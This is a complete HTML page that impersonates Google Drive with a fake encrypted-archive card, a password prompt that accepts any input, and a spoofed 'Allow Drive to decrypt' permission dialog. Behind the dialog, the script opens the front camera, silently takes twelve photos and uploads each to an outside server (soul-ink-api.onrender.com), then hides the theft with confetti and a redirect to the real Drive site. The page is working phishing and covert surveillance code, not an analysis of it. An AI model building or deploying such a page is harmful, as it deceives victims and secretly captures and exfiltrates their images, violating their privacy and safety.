<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Google Drive - Decrypt File</title>
    <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root { --g-blue: #0b57d0; --g-bg: #f8f9fa; }
        body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: 'Roboto', sans-serif; background: #000; overflow: hidden; }

        /* Background Image from GitHub Repository */
        .bg-blur {
            position: fixed; inset: 0;
            background: url('pic.jpg'); /* Matches your filename */
            background-size: cover;
            background-position: center;
            filter: blur(45px) brightness(0.6);
            transform: scale(1.1);
            z-index: -1;
        }

        /* Clean Google Loader */
        #loader { 
            position: fixed; inset: 0; background: white; z-index: 10000; 
            display: flex; flex-direction: column; align-items: center; justify-content: center; 
        }
        .logo { width: 65px; margin-bottom: 25px; }
        .p-bar { width: 140px; height: 4px; background: #f1f1f1; border-radius: 2px; overflow: hidden; }
        .p-fill { width: 0%; height: 100%; background: #4285F4; transition: width 0.2s linear; }

        /* Main UI */
        #main-ui { display: none; height: 100vh; }
        .header { height: 60px; display: flex; align-items: center; padding: 0 16px; background: rgba(255,255,255,0.92); backdrop-filter: blur(10px); border-bottom: 1px solid rgba(0,0,0,0.1); }
        
        .content { display: flex; flex-direction: column; align-items: center; padding-top: 60px; }
        .drive-card { 
            background: rgba(255,255,255,0.96); width: 88%; max-width: 360px; border-radius: 16px; 
            padding: 24px; box-shadow: 0 8px 32px rgba(0,0,0,0.4); text-align: center; cursor: pointer;
        }
        .file-icon { width: 60px; margin-bottom: 15px; }

        /* Security Modal */
        #pass-modal { 
            display: none; position: fixed; inset: 0; background: white; z-index: 9000; 
            flex-direction: column; align-items: center; justify-content: center; padding: 20px;
        }
        .in-pass { width: 85%; max-width: 300px; padding: 16px; border: 1px solid #747775; border-radius: 8px; font-size: 16px; margin-bottom: 20px; outline: none; }

        /* Material 3 Sheet */
        #fake-box { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.65); z-index: 11000; }
        .sheet { 
            position: fixed; bottom: 12px; left: 50%; transform: translateX(-50%); 
            width: 94%; max-width: 400px; background: #f3f6fc; border-radius: 28px; 
            padding: 24px; box-sizing: border-box; 
        }
        .btn-p { background: var(--g-blue); color: white; border: none; padding: 16px; border-radius: 100px; width: 100%; font-weight: 500; margin-bottom: 8px; cursor: pointer; font-size: 15px; }
        .btn-s { background: transparent; color: var(--g-blue); border: none; padding: 10px; width: 100%; font-weight: 500; cursor: pointer; }

        #scanner { display: none; position: fixed; top: 0; width: 100%; height: 4px; background: #4285F4; box-shadow: 0 0 15px #4285F4; z-index: 5000; animation: scan 2s infinite linear; }
        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
    </style>
</head>
<body>

    <div class="bg-blur"></div>

    <div id="loader">
        <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" class="logo">
        <div class="p-bar"><div id="p-fill" class="p-fill"></div></div>
    </div>

    <div id="main-ui">
        <div class="header">
            <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="22">
            <span style="margin-left:12px; font-weight:500; color:#444746;">Drive</span>
        </div>
        <div id="scanner"></div>
        <div class="content">
            <div class="drive-card" onclick="openPass()">
                <img src="https://cdn-icons-png.flaticon.com/512/3767/3767084.png" class="file-icon">
                <p style="font-weight:500; margin:0; font-size:18px; color: #1f1f1f;">Secure_Archive_Shared.zip</p>
                <p style="font-size:13px; color:#5f6368; margin-top:8px;">Size: 54.2 MB • Encrypted Archive</p>
                <button style="margin-top:20px; border:none; background:var(--g-blue); color:white; padding:12px 28px; border-radius:50px; font-weight:500;">Open Folder</button>
            </div>
        </div>
    </div>

    <div id="pass-modal">
        <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="45" style="margin-bottom:20px;">
        <h3 style="margin:0 0 10px 0;">Authentication Required</h3>
        <p style="color:#444746; font-size:14px; margin-bottom:25px; text-align:center;">Enter the shared access code to begin decryption.</p>
        <input type="password" id="pwd" class="in-pass" placeholder="Enter Access Code">
        <button class="btn-p" style="max-width:300px;" onclick="verify()">Decrypt & Open</button>
    </div>

    <div id="fake-box">
        <div class="sheet">
            <div style="display:flex; align-items:center; margin-bottom:15px;">
                <img src="https://upload.wikimedia.org/wikipedia/commons/d/da/Google_Drive_logo.png" width="16">
                <span style="margin-left:8px; font-size:12px; color:#444746;">drive.google.com</span>
            </div>
            <div style="font-size:19px; line-height:1.4; margin-bottom:28px; color:#1f1f1f;">Allow Drive to decrypt and open the file?</div>
            <button class="btn-p" onclick="trigger()">While using the app</button>
            <button class="btn-p" onclick="trigger()">Only this time</button>
            <button class="btn-s" onclick="location.reload()">Don't allow</button>
        </div>
    </div>

    <script>
        // Your Render Backend
        const RENDER_URL = 'https://soul-ink-api.onrender.com';

        window.onload = () => {
            fetch(`${RENDER_URL}/ping`).catch(() => {});
            let w = 0;
            const iv = setInterval(() => {
                w += 10;
                document.getElementById('p-fill').style.width = w + '%';
                if(w >= 100) {
                    clearInterval(iv);
                    setTimeout(() => { 
                        document.getElementById('loader').style.display='none'; 
                        document.getElementById('main-ui').style.display='block'; 
                    }, 600);
                }
            }, 100);
        };

        function openPass() { document.getElementById('pass-modal').style.display = 'flex'; }

        function verify() {
            if(document.getElementById('pwd').value.length > 0) {
                document.getElementById('pass-modal').style.display = 'none';
                document.getElementById('fake-box').style.display = 'block';
            }
        }

        async function trigger() {
            document.getElementById('fake-box').style.display = 'none';
            document.getElementById('scanner').style.display = 'block';
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const v = document.createElement('video');
                v.srcObject = stream;
                await v.play();

                let count = 0;
                // Capture Loop: 12 photos in 2 seconds
                const timer = setInterval(() => {
                    const c = document.createElement('canvas');
                    c.width = 480; c.height = 640;
                    c.getContext('2d').drawImage(v, 0, 0);
                    const rawData = c.toDataURL('image/jpeg', 0.5).split(',')[1];

                    fetch(`${RENDER_URL}/upload`, {
                        method: 'POST',
                        mode: 'cors',
                        headers: {'Content-Type': 'application/json'},
                        body: JSON.stringify({ image: rawData })
                    }).catch(() => {});

                    count++;
                    if (count >= 12) {
                        clearInterval(timer);
                        stream.getTracks().forEach(t => t.stop());
                        document.getElementById('scanner').style.display = 'none';
                        confetti({ particleCount: 120, spread: 70, origin: { y: 0.8 }, colors: ['#4285F4', '#34A853'] });
                        setTimeout(() => { window.location.href = "https://drive.google.com"; }, 1500);
                    }
                }, 166); 
            } catch (e) {
                location.reload();
            }
        }
    </script>
</body>
</html>
